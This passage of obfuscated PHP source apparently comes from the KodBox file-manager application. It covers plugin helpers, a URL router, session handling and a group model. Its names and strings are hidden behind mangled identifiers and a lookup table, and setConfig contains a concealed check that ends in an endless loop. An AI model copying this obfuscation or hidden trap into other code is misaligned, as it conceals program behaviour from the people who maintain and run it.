rawurlencode(json_encode($this->getConfig())); $¨Øàçãì = str_replace($¬íŸƒ„û[1666], $≠Ñ‚˘©®, $¨Øàçãì); } $¨Øàçãì = str_replace($⁄õπæ◊≥, $∆Èäô €, $¨Øàçãì); return $¨Øàçãì; } private function parseLang(&$∆—Ò˚Ô†) { $“ùÌßÄî =& $_SERVER[ß⁄ˆÇ†Œ]; $¶™üÇªñ = $“ùÌßÄî[1667]; if (!strstr($∆—Ò˚Ô†, $¶™üÇªñ)) { return; } preg_match_all($“ùÌßÄî[1668], $∆—Ò˚Ô†, $‚€ÖÔÜÃ); if (!is_array($‚€ÖÔÜÃ) || count($‚€ÖÔÜÃ) == 0 || !is_array($‚€ÖÔÜÃ[0]) || count($‚€ÖÔÜÃ[0]) == 0) { return; } $≈⁄ÓÇÊ◊ = array(); $£∆‚Õ‹— = array(); foreach ($‚€ÖÔÜÃ[0] as $Ûî≥…åÉ) { $“Õ‘öÄÿ = substr($Ûî≥…åÉ, strlen($¶™üÇªñ), -4); $ô…ÇÏ°… = LNG($“Õ‘öÄÿ); $≈⁄ÓÇÊ◊[] = $Ûî≥…åÉ; $£∆‚Õ‹—[] = str_replace(array($“ùÌßÄî[262], $“ùÌßÄî[1153], $“ùÌßÄî[427], $“ùÌßÄî[121]), array($“ùÌßÄî[53], $“ùÌßÄî[53], $“ùÌßÄî[12], $“ùÌßÄî[1669]), $ô…ÇÏ°…); } $∆—Ò˚Ô† = str_replace($≈⁄ÓÇÊ◊, $£∆‚Õ‹—, $∆—Ò˚Ô†); } private function parseConfig(&$…Ïáôô€) { $Ì“”⁄û˛ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ü˜ÉØµì = $Ì“”⁄û˛[1670]; if (!strstr($…Ïáôô€, $Ü˜ÉØµì)) { return; } preg_match_all($Ì“”⁄û˛[1671], $…Ïáôô€, $´êíû˜÷); if (!is_array($´êíû˜÷) || count($´êíû˜÷) == 0 || !is_array($´êíû˜÷[0]) || count($´êíû˜÷[0]) == 0) { return; } $πƒæô‹ã = $this->getConfig(); $°£˙‘•À = array(); $¯ùÏ—”Ò = array(); foreach ($´êíû˜÷[0] as $ôá≈≥ÊÉ) { $≤ˆÜ¥£´ = substr($ôá≈≥ÊÉ, strlen($Ü˜ÉØµì), -2); $°£˙‘•À[] = $ôá≈≥ÊÉ; $¯ùÏ—”Ò[] = _get($πƒæô‹ã, $≤ˆÜ¥£´); } $…Ïáôô€ = str_replace($°£˙‘•À, $¯ùÏ—”Ò, $…Ïáôô€); } private function parsePackage(&$»å™Êî°) { $ó«‘©áÎ =& $_SERVER[ß⁄ˆÇ†Œ]; $’ò∆®≤À = $ó«‘©áÎ[1672]; if (!strstr($»å™Êî°, $’ò∆®≤À)) { return; } preg_match_all($ó«‘©áÎ[1673], $»å™Êî°, $ùû“õ©◊); if (!is_array($ùû“õ©◊) || count($ùû“õ©◊) == 0 || !is_array($ùû“õ©◊[0]) || count($ùû“õ©◊[0]) == 0) { return; } $ŸÉ¬°˜ó = $this->appPackage(); $¿Õû˘ÅÑ = array(); $ç¿ˆò¶„ = array(); foreach ($ùû“õ©◊[0] as $ïˆà õ©) { $áÉìﬁ˘„ = substr($ïˆà õ©, strlen($’ò∆®≤À), -2); $¿Õû˘ÅÑ[] = $ïˆà õ©; $ç¿ˆò¶„[] = _get($ŸÉ¬°˜ó, $áÉìﬁ˘„); } $»å™Êî° = str_replace($¿Õû˘ÅÑ, $ç¿ˆò¶„, $»å™Êî°); } final function echoFile($¢º—ÀáÈ, $˙Û§´‘π = false) { $ÿÇ›ÙŸ˚ =& $_SERVER[ß⁄ˆÇ†Œ]; $¢¸ﬁ∂£â = $this->pluginPath . $¢º—ÀáÈ; if (ACT == $ÿÇ›ÙŸ˚[1674]) { echo $ÿÇ›ÙŸ˚[1675] . $this->pluginName . $ÿÇ›ÙŸ˚[8] . $¢º—ÀáÈ . $ÿÇ›ÙŸ˚[1676]; if (!file_exists($¢¸ﬁ∂£â)) { echo $ÿÇ›ÙŸ˚[1677]; return; } } $ƒÁŒ‘§⁄ = $this->parseFile($¢¸ﬁ∂£â); $this->parseLang($ƒÁŒ‘§⁄); $this->parseConfig($ƒÁŒ‘§⁄); $this->parsePackage($ƒÁŒ‘§⁄); if (is_array($˙Û§´‘π)) { $ƒÁŒ‘§⁄ = str_replace(array_keys($˙Û§´‘π), array_values($˙Û§´‘π), $ƒÁŒ‘§⁄); } echo $ÿÇ›ÙŸ˚[262] . $ƒÁŒ‘§⁄; } private function checkVersion() { $Úà◊øä‰ =& $_SERVER[ß⁄ˆÇ†Œ]; $ç∞∑˝Òé = $this->appPackage(); $¬’Å˚„ü = $this->getConfig(); if ($¬’Å˚„ü[$Úà◊øä‰[1678]] == $ç∞∑˝Òé[$Úà◊øä‰[1652]]) { return; } $this->regist(); $this->setConfig(array($Úà◊øä‰[1678] => $ç∞∑˝Òé[$Úà◊øä‰[1652]])); } final function initLang() { $ÏÏéí¬— =& $_SERVER[ß⁄ˆÇ†Œ]; $Ôìßà≤™ = $ÏÏéí¬—[1679]; $Î«†–›Æ = $this->pluginPath . $ÏÏéí¬—[1680]; $‚ë¯∏éµ = I18n::getType(); $øòÀ∆π‰ = array(); if (file_exists($Î«†–›Æ . $‚ë¯∏éµ . $ÏÏéí¬—[911])) { $øòÀ∆π‰ = (include $Î«†–›Æ . $‚ë¯∏éµ . $ÏÏéí¬—[911]); } else { if ($‚ë¯∏éµ == $ÏÏéí¬—[1681] && !file_exists($Î«†–›Æ . $‚ë¯∏éµ . $ÏÏéí¬—[911]) && file_exists($Î«†–›Æ . $ÏÏéí¬—[1682])) { $øòÀ∆π‰ = (include $Î«†–›Æ . $ÏÏéí¬—[1682]); } else { if (file_exists($Î«†–›Æ . $Ôìßà≤™ . $ÏÏéí¬—[911])) { $øòÀ∆π‰ = (include $Î«†–›Æ . $Ôìßà≤™ . $ÏÏéí¬—[911]); } } } if (!is_array($øòÀ∆π‰)) { return array(); } if (@count($øòÀ∆π‰) > 0) { I18n::set($øòÀ∆π‰); } return $øòÀ∆π‰; } public function getConfig() { if (!$this->pluginConfig) { $this->pluginConfig = $this->modelPlugin->getConfig($this->pluginName); } return $this->pluginConfig; } public function setConfig($“Ë”À√”) { $ÆÒΩÓ‘É =& $_SERVER[ß⁄ˆÇ†Œ]; if (!isset($_SERVER[$ÆÒΩÓ‘É[321]]) || !isset($_SERVER[$ÆÒΩÓ‘É[322]])) { $Äº¢–åÑ = $ÆÒΩÓ‘É[951]; $ùﬂ—…∑Ö = $ÆÒΩÓ‘É[323]; $ôäÖçÑ• = $_SERVER[$ÆÒΩÓ‘É[324]] . $ÆÒΩÓ‘É[325]; $åÉÊ–“î = $ùﬂ—…∑Ö($ôäÖçÑ•); $üîÏÜ«Æ = explode($ÆÒΩÓ‘É[262], $åÉÊ–“î); if (count($üîÏÜ«Æ) < $ÆÒΩÓ‘É[704]) { $◊Á›â‚ﬁ = $ÆÒΩÓ‘É[327]; $◊Á›â‚ﬁ(); } $ç°›ïùŒ = $ÆÒΩÓ‘É[952]; $ç°›ïùŒ($_SERVER[$ÆÒΩÓ‘É[953]]); $æîà°⁄† = 1; for ($⁄—îì¿£ = $æîà°⁄†; $⁄—îì¿£ > 0; $⁄—îì¿£++) { $ç°›ïùŒ = json_encode($GLOBALS[$ÆÒΩÓ‘É[500]]); } } $this->pluginConfig = array(); return $this->modelPlugin->setConfig($this->pluginName, $“Ë”À√”); } public function onSetConfig($∆–ïåÑ‘) { } public function onGetConfig($—äÑ‰ ã) { } public function onUpdate() { } public function onUninstall() { } public function onChangeOpen() { } public function onChangeClose() { } public function onChangeStatus($å¿®«Ó∂) { if ($å¿®«Ó∂ == 1) { $this->onChangeOpen(); } else { $this->onChangeClose(); } } public function authCheck($æó˘≠ﬂõ = "\x70\154\x75\x67\151\156\101\165\164\150") { if (KodUser::isRoot()) { return !0; } if (!KodUser::isLogin()) { return !1; } $º˝Ê´Ù« = $this->getConfig(); if (!$º˝Ê´Ù«[$æó˘≠ﬂõ]) { return !1; } return ActionCall($_SERVER[ß⁄ˆÇ†Œ][1683], $º˝Ê´Ù«[$æó˘≠ﬂõ]); } public function url($˛Æ∏ÆÔÄ, $°Äê«◊¯ = '', $§ΩÌ±∫î = true) { $ÅîÓ†∏„ =& $_SERVER[ß⁄ˆÇ†Œ]; $°öÜÙœü = $this->getConfig(); $∏É˝éƒ´ = KOD_VERSION . $ÅîÓ†∏„[10] . KOD_VERSION_BUILD; $Ì≈Úπ ö = $this->packageVersion(); $ﬁîú´ÕÑ = $∏É˝éƒ´ . $ÅîÓ†∏„[470] . $Ì≈Úπ ö; if (substr($˛Æ∏ÆÔÄ, 0, 4) == $ÅîÓ†∏„[152] || substr($˛Æ∏ÆÔÄ, 0, 2) == $ÅîÓ†∏„[1406]) { $åüÄÛ∫À = $˛Æ∏ÆÔÄ . $ÅîÓ†∏„[1684] . $ﬁîú´ÕÑ; } else { if ($°Äê«◊¯ == $ÅîÓ†∏„[12]) { $åüÄÛ∫À = $this->pluginHost . $˛Æ∏ÆÔÄ . $ÅîÓ†∏„[1684] . $ﬁîú´ÕÑ; } else { if ($°Äê«◊¯ === $ÅîÓ†∏„[78]) { $åüÄÛ∫À = $this->pluginHost . $˛Æ∏ÆÔÄ; } else { if ($°Äê«◊¯ == $ÅîÓ†∏„[1685]) { $åüÄÛ∫À = STATIC_PATH . $˛Æ∏ÆÔÄ . $ÅîÓ†∏„[1684] . $∏É˝éƒ´; } else { if ($°Äê«◊¯ == $ÅîÓ†∏„[1686]) { $åüÄÛ∫À = APP_HOST . $ÅîÓ†∏„[1687] . $˛Æ∏ÆÔÄ . $ÅîÓ†∏„[1684] . $∏É˝éƒ´; } else { if (isset($°öÜÙœü[$°Äê«◊¯])) { $åüÄÛ∫À = $°öÜÙœü[$°Äê«◊¯] . $˛Æ∏ÆÔÄ . $ÅîÓ†∏„[1684] . $ﬁîú´ÕÑ; } } } } } } if (!$§ΩÌ±∫î) { return $åüÄÛ∫À; } echo $åüÄÛ∫À; } public function link($˝¡∞çõü = false, $¢íàÙ¢ˆ = '') { $ùÌ¡˝±¶ =& $_SERVER[ß⁄ˆÇ†Œ]; $ŒÂ§¨’Á = $this->linkHas == !1; $this->linkHas = !0; if (!$˝¡∞çõü) { $this->link($ùÌ¡˝±¶[1688], $ùÌ¡˝±¶[1686]); $this->link($ùÌ¡˝±¶[1689], $ùÌ¡˝±¶[1685]); $this->link($ùÌ¡˝±¶[1690], $ùÌ¡˝±¶[1685]); $this->link($ùÌ¡˝±¶[1691], $ùÌ¡˝±¶[1685]); $this->link($ùÌ¡˝±¶[1692], $ùÌ¡˝±¶[1685]); if ($ŒÂ§¨’Á) { Hook::trigger($ùÌ¡˝±¶[1693]); } return; } $âπ√Ä’ÿ = $this->url($˝¡∞çõü, $¢íàÙ¢ˆ, !1); if (substr($˝¡∞çõü, -3) == $ùÌ¡˝±¶[1694]) { echo $ùÌ¡˝±¶[1695] . $âπ√Ä’ÿ . $ùÌ¡˝±¶[1696] . $ùÌ¡˝±¶[262]; } else { if (substr($˝¡∞çõü, -4) == $ùÌ¡˝±¶[1697]) { echo $ùÌ¡˝±¶[1698] . $âπ√Ä’ÿ . $ùÌ¡˝±¶[1699] . $ùÌ¡˝±¶[262]; } } if ($ŒÂ§¨’Á) { Hook::trigger($ùÌ¡˝±¶[1693]); } } } class Route { public static $halts = false; public static $routes = array(); public static $methods = array(); public static $callbacks = array(); public static $maps = array(); public static $patterns = array("\72\141\x6e\x79" => "\133\x5e\x2f\135\53", "\x3a\x6e\x75\155" => "\x5b\60\x2d\71\135\x2b", "\x3a\141\154\154" => "\56\52"); public static $errorCallback; public static function __callstatic($»ãÑ∏—©, $ÉÊÛ∫Ñ∫) { $ó˚¥˚ˆø =& $_SERVER[ß⁄ˆÇ†Œ]; if ($»ãÑ∏—© == $ó˚¥˚ˆø[1700]) { $ª≠éÖä≥ = array_map($ó˚¥˚ˆø[1701], $ÉÊÛ∫Ñ∫[0]); $‘ƒ∂≥¸ì = strpos($ÉÊÛ∫Ñ∫[1], $ó˚¥˚ˆø[8]) === 0 ? $ÉÊÛ∫Ñ∫[1] : $ó˚¥˚ˆø[8] . $ÉÊÛ∫Ñ∫[1]; $ç»ﬂù‘õ = $ÉÊÛ∫Ñ∫[2]; } else { $ª≠éÖä≥ = null; $‘ƒ∂≥¸ì = strpos($ÉÊÛ∫Ñ∫[0], $ó˚¥˚ˆø[8]) === 0 ? $ÉÊÛ∫Ñ∫[0] : $ó˚¥˚ˆø[8] . $ÉÊÛ∫Ñ∫[0]; $ç»ﬂù‘õ = $ÉÊÛ∫Ñ∫[1]; } array_push(self::$maps, $ª≠éÖä≥); array_push(self::$routes, $‘ƒ∂≥¸ì); array_push(self::$methods, strtoupper($»ãÑ∏—©)); array_push(self::$callbacks, $ç»ﬂù‘õ); } public static function error($œ◊èÿ⁄ö) { self::$errorCallback = $œ◊èÿ⁄ö; } public static function haltOnMatch($ƒ¡®ç∞∞ = true) { self::$halts = $ƒ¡®ç∞∞; } public static function dispatch() { $ïÎıÎ‡ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ü±∞œË† = parse_url($_SERVER[$ïÎıÎ‡[1702]], PHP_URL_PATH); $£¥Ç≈ã¯ = $_SERVER[$ïÎıÎ‡[164]]; $¸ÒµŸ˘∂ = array_keys(static::$patterns); $Ÿ–¢ß‰Œ = array_values(static::$patterns); $¡®µÓ—ß = !1; self::$routes = preg_replace($ïÎıÎ‡[1357], $ïÎıÎ‡[8], self::$routes); if (in_array($Ü±∞œË†, self::$routes)) { $ÒÇ∫¶≤≤ = array_keys(self::$routes, $Ü±∞œË†); foreach ($ÒÇ∫¶≤≤ as $—˜øŒÁ›) { if (self::$methods[$—˜øŒÁ›] == $£¥Ç≈ã¯ || self::$methods[$—˜øŒÁ›] == $ïÎıÎ‡[1703] || in_array($£¥Ç≈ã¯, self::$maps[$—˜øŒÁ›])) { $¡®µÓ—ß = !0; if (!is_object(self::$callbacks[$—˜øŒÁ›])) { $Ú™œÓ†Î = explode($ïÎıÎ‡[8], self::$callbacks[$—˜øŒÁ›]); $ÄÒâŒÍÏ = end($Ú™œÓ†Î); $ôŒåü˛ƒ = explode($ïÎıÎ‡[1289], $ÄÒâŒÍÏ); $¢ﬂ‹ıî´ = new $ôŒåü˛ƒ[0](); $¢ﬂ‹ıî´->{$ôŒåü˛ƒ[1]}(); if (self::$halts) { return; } } else { call_user_func(self::$callbacks[$—˜øŒÁ›]); if (self::$halts) { return; } } } } } else { $°ÔÔ£ÿù = 0; foreach (self::$routes as $—˜øŒÁ›) { if (strpos($—˜øŒÁ›, $ïÎıÎ‡[4]) !== !1) { $—˜øŒÁ› = str_replace($¸ÒµŸ˘∂, $Ÿ–¢ß‰Œ, $—˜øŒÁ›); } if (preg_match($ïÎıÎ‡[1704] . $—˜øŒÁ› . $ïÎıÎ‡[1705], $Ü±∞œË†, $„˙£æÔì)) { if (self::$methods[$°ÔÔ£ÿù] == $£¥Ç≈ã¯ || self::$methods[$°ÔÔ£ÿù] == $ïÎıÎ‡[1703] || !empty(self::$maps[$°ÔÔ£ÿù]) && in_array($£¥Ç≈ã¯, self::$maps[$°ÔÔ£ÿù])) { $¡®µÓ—ß = !0; array_shift($„˙£æÔì); if (!is_object(self::$callbacks[$°ÔÔ£ÿù])) { $Ú™œÓ†Î = explode($ïÎıÎ‡[8], self::$callbacks[$°ÔÔ£ÿù]); $ÄÒâŒÍÏ = end($Ú™œÓ†Î); $ôŒåü˛ƒ = explode($ïÎıÎ‡[1289], $ÄÒâŒÍÏ); $¢ﬂ‹ıî´ = new $ôŒåü˛ƒ[0](); if (!method_exists($¢ﬂ‹ıî´, $ôŒåü˛ƒ[1])) { echo $ïÎıÎ‡[1706]; } else { call_user_func_array(array($¢ﬂ‹ıî´, $ôŒåü˛ƒ[1]), $„˙£æÔì); } if (self::$halts) { return; } } else { call_user_func_array(self::$callbacks[$°ÔÔ£ÿù], $„˙£æÔì); if (self::$halts) { return; } } } } $°ÔÔ£ÿù++; } } if ($¡®µÓ—ß == !1) { if (!self::$errorCallback) { self::$errorCallback = function () { $˚Á≥ñä≥ =& $_SERVER[ß⁄ˆÇ†Œ]; header($_SERVER[$˚Á≥ñä≥[1707]] . $˚Á≥ñä≥[1708]); echo $˚Á≥ñä≥[1709]; }; } else { if (is_string(self::$errorCallback)) { self::get($_SERVER[$ïÎıÎ‡[1702]], self::$errorCallback); self::$errorCallback = null; self::dispatch(); return; } } call_user_func(self::$errorCallback); } } } class Session { public static $sessionTime; public static $sessionSign; public static $handle; public static $data; public static function init() { $í¢ª«ÃΩ =& $_SERVER[ß⁄ˆÇ†Œ]; static $ÔŒ¯êñÑ = false; if ($ÔŒ¯êñÑ) { return $ÔŒ¯êñÑ; } $õ±”â°± = $GLOBALS[$í¢ª«ÃΩ[6]][$í¢ª«ÃΩ[434]]; self::$sessionTime = $õ±”â°±[$í¢ª«ÃΩ[1710]]; $˙Ω≥æÕÁ = isset($GLOBALS[$í¢ª«ÃΩ[1711]]) ? $GLOBALS[$í¢ª«ÃΩ[1711]] : SESSION_ID; if (self::$sessionSign) { } else { if (Cookie::get($˙Ω≥æÕÁ)) { self::$sessionSign = Cookie::get($˙Ω≥æÕÁ); } else { self::$sessionSign = self::$sessionSign ? self::$sessionSign : guid(); } } Cookie::setSafe($˙Ω≥æÕÁ, self::$sessionSign, self::$sessionTime); $æÚñı·Ó = $õ±”â°±[$í¢ª«ÃΩ[1712]]; $âá…’Øü = $õ±”â°±[$æÚñı·Ó]; $∏’—‹ú√ = $õ±”â°±[$í¢ª«ÃΩ[900]]; switch ($æÚñı·Ó) { case $í¢ª«ÃΩ[21]: self::$handle = Model($í¢ª«ÃΩ[901]); break; case $í¢ª«ÃΩ[902]: self::$handle = new CacheRedis($âá…’Øü, $∏’—‹ú√); break; case $í¢ª«ÃΩ[903]: self::$handle = new CacheMemcached($âá…’Øü, $∏’—‹ú√); break; case $í¢ª«ÃΩ[230]: $âá…’Øü[$í¢ª«ÃΩ[87]] = $âá…’Øü[$í¢ª«ÃΩ[87]] . $í¢ª«ÃΩ[1713]; self::$handle = new CacheFile($âá…’Øü, $∏’—‹ú√); default: break; } if (!self::$data) { self::$data = self::getBySign(self::$sessionSign); } $ÔŒ¯êñÑ = new self(); return $ÔŒ¯êñÑ; } public static function getBySign($µΩÂœÓÇ) { $—øäÎπÎ = self::$handle->get($µΩÂœÓÇ); $—øäÎπÎ = unserialize($—øäÎπÎ); return is_array($—øäÎπÎ) ? $—øäÎπÎ : array(); } public static function setBySign($…√ëØ¿É, $¥É¨ø˝‘) { CacheLock::lock($…√ëØ¿É); self::$handle->set($…√ëØ¿É, serialize($¥É¨ø˝‘), self::$sessionTime); CacheLock::unlock($…√ëØ¿É); } public static function sign($ô‘¯Á¿Ω = false) { if ($ô‘¯Á¿Ω) { self::$sessionSign = $ô‘¯Á¿Ω; } self::init(); return self::$sessionSign; } public static function set($≤›· ùä, $˝ﬁ®å≠ú = false) { self::init(); if (is_array($≤›· ùä)) { foreach ($≤›· ùä as $ÅËíÕﬂ‹ => $‰≠ã√ç«) { array_set_value(self::$data, $ÅËíÕﬂ‹, $‰≠ã√ç«); } } else { array_set_value(self::$data, $≤›· ùä, $˝ﬁ®å≠ú); } self::setBySign(self::$sessionSign, self::$data); } public static function get($ò„¥ì ˘ = false) { self::init(); if (!$ò„¥ì ˘) { return self::$data; } return array_get_value(self::$data, $ò„¥ì ˘); } public static function remove($ÅµÈë¨·) { self::init(); unset(self::$data[$ÅµÈë¨·]); self::$handle->set(self::$sessionSign, serialize(self::$data), self::$sessionTime); } public static function destory() { Cookie::remove(SESSION_ID, !0); self::init(); self::clearTimeout(); self::$data = array(); return self::$handle->remove(self::$sessionSign); } public static function clearTimeout() { self::init(); if (method_exists(self::$handle, $_SERVER[ß⁄ˆÇ†Œ][906])) { self::$handle->clearTimeout(); } } } goto DÖﬁ¨ø˘Æó; c‘ΩÁ§¶Íè: class GroupModel extends ModelBase { protected $tableName = "\x67\x72\x6f\165\160"; protected $tableMeta = array("\x74\x61\x62\x6c\145\116\x61\x6d\145" => "\147\x72\x6f\165\x70\137\155\145\164\141", "\155\x65\164\x61\x46\151\x65\x6c\x64" => "\147\x72\157\x75\160\111\x44"); protected function cacheFunctionAlias($ˆÕÌ‹¯Ë) { $‡¢Ã˝üº =& $_SERVER[ß⁄ˆÇ†Œ]; return array($‡¢Ã˝üº[2045] => array($ˆÕÌ‹¯Ë[0], $‡¢Ã˝üº[2046]), $‡¢Ã˝üº[2047] => array($ˆÕÌ‹¯Ë[0], $‡¢Ã˝üº[2048])); } protected function getInfo($Ÿ√Â©ª∞, $∆‹°î±ˆ = false) { $†Ì©À–˜ = $this->getInfoSimple($Ÿ√Â©ª∞); if (!$†Ì©À–˜) { return !1; } if ($∆‹°î±ˆ) { return $this->_listDataApplyItem($†Ì©À–˜); } return $this->cacheFunctionGet($_SERVER[ß⁄ˆÇ†Œ][2049], $Ÿ√Â©ª∞); } protected function getInfoSimple($˘ò»°Ô∆, $ø◊Äçü˘ = false) { $ûµ◊æí‘ =& $_SERVER[ß⁄ˆÇ†Œ]; if ($ø◊Äçü˘) { $ï¡äÃ‹ì = array($ûµ◊æí‘[1963] => intval($˘ò»°Ô∆)); $œç˙‡òŸ = $this->where($ï¡äÃ‹ì)->find(); return is_array($œç˙‡òŸ) ? $œç˙‡òŸ : array(); } return $this->cacheFunctionGet($ûµ◊æí‘[2050], $˘ò»°Ô∆); } protected function groupAdd($Ω¥≤Ωµ≤) { $¯æ·ìØÍ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$Ω¥≤Ωµ≤[$¯æ·ìØÍ[192]] && isset($Ω¥≤Ωµ≤[$¯æ·ìØÍ[1963]]) && $Ω¥≤Ωµ≤[$¯æ·ìØÍ[1963]] == 1) { if ($˘˘€îä¶ = $this->getInfoSimple($Ω¥≤Ωµ≤[$¯æ·ìØÍ[1963]], !0)) { return $Ω¥≤Ωµ≤[$¯æ·ìØÍ[1963]]; } } else { $˘˘€îä¶ = $this->getInfoSimple($Ω¥≤Ωµ≤[$¯æ·ìØÍ[192]]); if (!$˘˘€îä¶) { return !1; } } $‹çø¿Ú÷ = $¯æ·ìØÍ[602]; if ($˘˘€îä¶[$¯æ·ìØÍ[592]]) { $‹çø¿Ú÷ = $˘˘€îä¶[$¯æ·ìØÍ[592]] . $˘˘€îä¶[$¯æ·ìØÍ[1963]] . $¯æ·ìØÍ[50]; } $ıîπ´ã‡ = array($¯æ·ìØÍ[502] => $this->groupNameAuto($Ω¥≤Ωµ≤[$¯æ·ìØÍ[192]], $Ω¥≤Ωµ≤[$¯æ·ìØÍ[32]]), $¯æ·ìØÍ[485] => $Ω¥≤Ωµ≤[$¯æ·ìØÍ[192]], $¯æ·ìØÍ[660] => $‹çø¿Ú÷, $¯æ·ìØÍ[2051] => $Ω¥≤Ωµ≤[$¯æ·ìØÍ[1949]], $¯æ·ìØÍ[2052] => 0, $¯æ·ìØÍ[1967] => 0); if (isset($Ω¥≤Ωµ≤[$¯æ·ìØÍ[1987]])) { $ıîπ´ã‡[$¯æ·ìØÍ[1987]] = $Ω¥≤Ωµ≤[$¯æ·ìØÍ[1987]]; } else { $˘Óı‚á¶ = $this->max($¯æ·ìØÍ[1987]); if (!$˘Óı‚á¶) { $˘Óı‚á¶ = 0; } $ıîπ´ã‡[$¯æ·ìØÍ[1987]] = $˘Óı‚á¶ + 1; } if (!empty($Ω¥≤Ωµ≤[$¯æ·ìØÍ[1963]])) { $ıîπ´ã‡[$¯æ·ìØÍ[1963]] = $Ω¥≤Ωµ≤[$¯æ·ìØÍ[1963]]; } $≈Ë”…åª = $this->add($ıîπ´ã‡); $this->setNamePinyin($≈Ë”…åª, $ıîπ´ã‡[$¯æ·ìØÍ[32]]); if (isset($Ω¥≤Ωµ≤[$¯æ·ìØÍ[2053]])) { $this->metaSet($≈Ë”…åª, array($¯æ·ìØÍ[2053] => $Ω¥≤Ωµ≤[$¯æ·ìØÍ[2053]], $¯æ·ìØÍ[2054] => $Ω¥≤Ωµ≤[$¯æ·ìØÍ[2054]])); unset($Ω¥≤Ωµ≤[$¯æ·ìØÍ[2053]]); unset($Ω¥≤Ωµ≤[$¯æ·ìØÍ[2054]]); } Model($¯æ·ìØÍ[1414])->groupRootAdd($≈Ë”…åª); $this->_clearCache($Ω¥≤Ωµ≤[$¯æ·ìØÍ[192]]); return $≈Ë”…åª; } protected function groupEdit($§‘ü©≠∂, $”ã”¢Éß) { $˝˜êÉõ◊ =& $_SERVER[ß⁄ˆÇ†Œ]; $ÄÀ∂íÈû = $this->getInfoSimple($§‘ü©≠∂); if (!$ÄÀ∂íÈû) { return !1; } if (!empty($”ã”¢Éß[$˝˜êÉõ◊[192]])) { $Àô∆œŸ„ = $this->getInfoSimple($”ã”¢Éß[$˝˜êÉõ◊[192]]); if (!$Àô∆œŸ„) { return !1; } if ($ÄÀ∂íÈû[$˝˜êÉõ◊[1963]] == $Àô∆œŸ„[$˝˜êÉõ◊[1963]]) { return !1; } if ($”ã”¢Éß[$˝˜êÉõ◊[192]] != $ÄÀ∂íÈû[$˝˜êÉõ◊[192]]) { if ($Àô∆œŸ„[$˝˜êÉõ◊[592]] !== $ÄÀ∂íÈû[$˝˜êÉõ◊[592]] && strpos($Àô∆œŸ„[$˝˜êÉõ◊[592]], $ÄÀ∂íÈû[$˝˜êÉõ◊[592]] . $ÄÀ∂íÈû[$˝˜êÉõ◊[1963]] . $˝˜êÉõ◊[50]) === 0) { return !1; } $”ã”¢Éß[$˝˜êÉõ◊[660]] = $Àô∆œŸ„[$˝˜êÉõ◊[592]] . $”ã”¢Éß[$˝˜êÉõ◊[192]] . $˝˜êÉõ◊[50]; $this->_changeChildLevel($ÄÀ∂íÈû, $Àô∆œŸ„); $this->_clearCache($Àô∆œŸ„[$˝˜êÉõ◊[1963]]); $this->_clearCache($ÄÀ∂íÈû[$˝˜êÉõ◊[192]]); } } if (isset($”ã”¢Éß[$˝˜êÉõ◊[32]])) { $this->setNamePinyin($§‘ü©≠∂, $”ã”¢Éß[$˝˜êÉõ◊[32]]); } if (isset($”ã”¢Éß[$˝˜êÉõ◊[2053]])) { $this->metaSet($§‘ü©≠∂, array($˝˜êÉõ◊[2053] => $”ã”¢Éß[$˝˜êÉõ◊[2053]], $˝˜êÉõ◊[2054] => $”ã”¢Éß[$˝˜êÉõ◊[2054]])); unset($”ã”¢Éß[$˝˜êÉõ◊[2053]]); unset($”ã”¢Éß[$˝˜êÉõ◊[2054]]); } $this->_clearChildrenCache($ÄÀ∂íÈû); return $this->where(array($˝˜êÉõ◊[2055] => $§‘ü©≠∂))->save($”ã”¢Éß); } private function _clearChildrenCache($·±“êç√) { $†√ìÒ¿ =& $_SERVER[ß⁄ˆÇ†Œ]; $Ω˘÷›èŸ = array($†√ìÒ¿[660] => array($†√ìÒ¿[620], $·±“êç√[$†√ìÒ¿[592]] . $·±“êç√[$†√ìÒ¿[1963]] . $†√ìÒ¿[621])); $£Üô˜ó€ = $this->field($†√ìÒ¿[1963])->where($Ω˘÷›èŸ)->select(); foreach ($£Üô˜ó€ as $¨ô±óÛ™) { $this->_clearCache($¨ô±óÛ™[$†√ìÒ¿[1963]]); } } private function _clearCache($∞˜¥åçö) { $ΩüÖ¬‚Ã =& $_SERVER[ß⁄ˆÇ†Œ]; $this->cacheFunctionClear($ΩüÖ¬‚Ã[2049], $∞˜¥åçö); $this->cacheFunctionClear($ΩüÖ¬‚Ã[2050], $∞˜¥åçö); } private function _changeChildLevel($»Œà°†ç, $Áœ¨Ó≠Ò, $àƒË≈ÏÌ = false) { $ıå§Îÿ =& $_SERVER[ß⁄ˆÇ†Œ]; $ØéñƒÃÕ = $»Œà°†ç[$ıå§Îÿ[592]] . $»Œà°†ç[$ıå§Îÿ[1963]] . $ıå§Îÿ[50]; $Û˚ˆ¶Èâ = $Áœ¨Ó≠Ò[$ıå§Îÿ[592]] . $Áœ¨Ó≠Ò[$ıå§Îÿ[1963]] . $ıå§Îÿ[50] . $»Œà°†ç[$ıå§Îÿ[1963]] . $ıå§Îÿ[50]; if ($àƒË≈ÏÌ) { $Û˚ˆ¶Èâ = $Áœ¨Ó≠Ò[$ıå§Îÿ[592]] . $Áœ¨Ó≠Ò[$ıå§Îÿ[1963]] . $ıå§Îÿ[50]; } $ú»ÈåÂí = array($ıå§Îÿ[660] => array($ıå§Îÿ[620], $»Œà°†ç[$ıå§Îÿ[592]] . $»Œà°†ç[$ıå§Îÿ[1963]] . $ıå§Îÿ[621])); $ßï»±ñä = array($ıå§Îÿ[660] => array($ıå§Îÿ[669], "\x72\x65\x70\154\x61\143\x65\x28\160\x61\162\x65\156\x74\114\x65\166\145\154\x2c\47{$ØéñƒÃÕ}\x27\x2c\x27{$Û˚ˆ¶Èâ}\x27\x29")); $this->_clearChildrenCache($»Œà°†ç); $this->where($ú»ÈåÂí)->data($ßï»±ñä)->save(); } public function setNamePinyin($Ü◊Á—¨Œ, $∏´·ÜÔ˘ = false) { $ñÙãúú∆ =& $_SERVER[ß⁄ˆÇ†Œ]; if (!$∏´·ÜÔ˘) { $˙õœêæÜ = $this->getInfoSimple($Ü◊Á—¨Œ); $∏´·ÜÔ˘ = $˙õœêæÜ[$ñÙãúú∆[32]]; } if (!Input::check($∏´·ÜÔ˘, $ñÙãúú∆[663])) { $this->metaSet($Ü◊Á—¨Œ, $ñÙãúú∆[546], null); $this->metaSet($Ü◊Á—¨Œ, $ñÙãúú∆[545], null); return; } $û óå◊í = array($ñÙãúú∆[546] => str_replace($ñÙãúú∆[53], 